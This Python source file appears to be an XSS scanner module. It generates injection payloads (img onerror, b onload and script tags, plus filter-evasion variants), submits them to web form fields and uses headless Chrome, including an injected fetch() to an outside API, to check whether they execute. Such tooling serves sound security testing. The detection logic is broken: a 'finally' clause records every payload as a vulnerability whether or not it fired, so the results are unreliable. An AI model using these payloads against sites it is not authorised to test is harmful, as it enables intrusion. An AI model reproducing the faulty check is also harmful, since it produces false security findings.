import selenium, selenium.webdriver, selenium.webdriver.support.expected_conditions, time, typing

import utils

'''
Gives information about a vulnerable form field
'''
class XSSVuln():
    def __init__(self, form: utils.Form, field: str, src: str, stype: str) -> None:
        self._form = form
        self._field = field
        self._src = src
        self._type = stype
    
    @property
    def form(self) -> utils.Form:
        return self._form
    
    def json(self) -> typing.Dict[str, str]:
        return {
            'field' : self._field,
            'src' : self._src,
            'type' : self._type
        }

    def __repr__(self) -> str:
        return f'\x1B[91mVulnerability detected!\x1B[0m\nOn field {self._field} in {self._form} with script {self._src}\n{self._type}'

'''
Generates a number of HTML elements which can deliver a script
'''
def script_injections(script: str) -> typing.List[str]:
    candidates = []

    image = f'<img src=\'fake_url\' onerror=\'{script}\' />'
    bold = f'<b onload=\'{script}\'>test</b>'
    script = f'<script>{script}</script>'

    candidates += [image, bold, script]
    candidates += utils.bl_avoid(image, ['img', 'src', 'onerror', 'http', 'fetch'])
    candidates += utils.bl_avoid(bold, ['onload', 'http', 'fetch'])
    candidates += utils.bl_avoid(script, ['script', 'http', 'fetch'])

    for i in range(len(candidates)):
        candidates[i] = candidates[i].replace('@@index@@', str(i))

    return candidates

'''
Tests a list of forms for JS injection vulnerabilities
'''
def test_scripts(targets: typing.List[utils.Form], limits: int, delay: typing.Optional[int]) -> typing.List[XSSVuln]:
    results = []

    driver_opts = selenium.webdriver.ChromeOptions()
    driver_opts.add_argument('headless')

    timestamp = str(time.time())

    for form in targets:
        for field in form.get_fields():
            injections = script_injections(f'document.body.innerHTML+="<br id=\\"vmap.{timestamp}.{form}.{field}.@@index@@\\" />";')
            for i in range(len(injections)):
                url, err = form.soupless_request({x : (injections[i] if x == field else '') for x in form.get_fields()})

                if err is not None:
                    continue

                driver = selenium.webdriver.Chrome(chrome_options=driver_opts)
                driver.get(url)
                try:
                    c = (selenium.webdriver.common.by.By.ID, f'vmap.{timestamp}.{form}.{field}.{i}')
                    selenium.webdriver.support.ui.WebDriverWait(driver, limits).until(selenium.webdriver.support.expected_conditions.presence_of_element_located(c))
                except selenium.common.exceptions.TimeoutException:
                    pass
                finally:
                    results.append(XSSVuln(form, field, injections[i], 'JS Injection'))
                driver.close()
                
                if delay is not None:
                    time.sleep(delay)
    
    driver.quit()
    return results

# Pick a good public API with no auth which shouldn't be allowed via. the CSP
# The API returns a JSON dump of a joke with type: 'programming' so should contain 'programming'
# API thanks to David Katz https://github.com/15Dkatz/official_joke_api
XSS_API_URL = 'https://official-joke-api.appspot.com/jokes/programming/random'
XSS_FLAG_TEXT = 'programming'

'''
Tests a list of forms for XSS vulnerabilities
'''
def test_xss(targets: typing.List[utils.Form], limits: int, delay: typing.Optional[int], flag_url: str, flag_text: str) -> typing.List[XSSVuln]:
    results = []

    driver_opts = selenium.webdriver.ChromeOptions()
    driver_opts.add_argument('headless')

    timestamp = str(time.time())

    for form in targets:
        for field in form.get_fields():
            injections = script_injections(f'fetch("{flag_url}").then(res => res.text()).then(text => document.body.innerHTML+="<span id=\\"vmap.{timestamp}.{form}.{field}.@@index@@\\">"+text+"</span>");')
            for i in range(len(injections)):
                url, err = form.soupless_request({x : (injections[i] if x == field else '') for x in form.get_fields()})

                if err is not None:
                    continue

                driver = selenium.webdriver.Chrome(chrome_options=driver_opts)
                driver.get(url)
                try:
                    c = (selenium.webdriver.common.by.By.ID, f'vmap.{timestamp}.{form}.{field}.{i}')
                    selenium.webdriver.support.ui.WebDriverWait(driver, limits).until(selenium.webdriver.support.expected_conditions.text_to_be_present_in_element(c, flag_text))
                except selenium.common.exceptions.TimeoutException:
                    pass
                finally:
                    results.append(XSSVuln(form, field, injections[i], 'JS Injection'))
                driver.close()
                
                if delay is not None:
                    time.sleep(delay)
    
    driver.quit()
    return results